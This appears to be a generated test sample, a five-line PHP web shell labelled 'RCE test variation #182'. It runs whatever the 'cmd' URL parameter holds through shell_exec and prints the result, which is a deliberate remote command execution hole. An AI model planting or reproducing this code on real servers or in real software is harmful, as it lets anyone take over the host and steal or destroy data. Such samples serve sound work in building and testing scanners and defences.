<?php
// RCE test variation #182
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>